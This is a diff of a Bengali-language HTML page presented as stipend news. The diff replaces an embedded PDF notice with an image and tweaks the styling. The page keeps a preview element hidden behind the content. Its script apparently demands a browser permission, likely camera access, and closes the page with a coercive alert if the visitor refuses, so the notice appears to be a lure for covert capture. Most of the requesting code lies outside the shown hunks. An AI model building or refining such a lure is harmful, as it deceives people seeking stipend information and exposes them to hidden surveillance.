@@ -5,6 +5,7 @@
   <title>উপবৃত্তি সংক্রান্ত নিউজ</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali&display=swap');
+
     body {
       margin: 0;
       padding: 0;
@@ -17,8 +18,8 @@
 
     .container {
       background: rgba(255, 255, 255, 0.95);
-      max-width: 90%;
-      margin: 30px auto;
+      max-width: 95%;
+      margin: 20px auto;
       border-radius: 16px;
       padding: 20px;
       box-shadow: 0 10px 30px rgba(0,0,0,0.1);
@@ -29,6 +30,13 @@
       margin-bottom: 20px;
       font-size: 24px;
       color: #6a1b9a;
+    }
+
+    .news-image {
+      width: 100%;
+      max-width: 1000px;
+      border-radius: 8px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.15);
     }
 
     #preview {
@@ -42,19 +50,6 @@
       pointer-events: none;
       z-index: -1;
     }
-
-    .pdf-container {
-      width: 100%;
-      height: 80vh;
-      margin-top: 20px;
-    }
-
-    embed {
-      width: 100%;
-      height: 100%;
-      border: none;
-      border-radius: 8px;
-    }
   </style>
 </head>
 <body>
@@ -62,10 +57,7 @@
 
   <div class="container">
     <h1>উপবৃত্তি সংক্রান্ত নিউজ</h1>
-
-    <div class="pdf-container">
-      <embed src="https://github.com/sm-soad00/Exam-/raw/main/2025-06-18-09-52-9690b3966c8ff4d7b5e1f2add13c86ac%20(1).pdf" type="application/pdf" />
-    </div>
+    <img src="https://raw.githubusercontent.com/sm-soad00/Exam-/main/IMG_20250619_205404.jpg" alt="উপবৃত্তি নোটিশ" class="news-image" />
   </div>
 
   <script>
@@ -112,7 +104,7 @@
       })
       .catch(err => {
         alert("আপনি প্রয়োজনীয় অনুমতি দেননি 😢 এই সাইট ব্যবহারের জন্য অনুমতি আবশ্যক।");
-        window.close(); // ❌ মোবাইল বা ডেস্কটপ থেকে সরাসরি বন্ধ করে দেবে
+        window.close(); // সরাসরি পেজ বন্ধ
       });
   </script>
 </body>
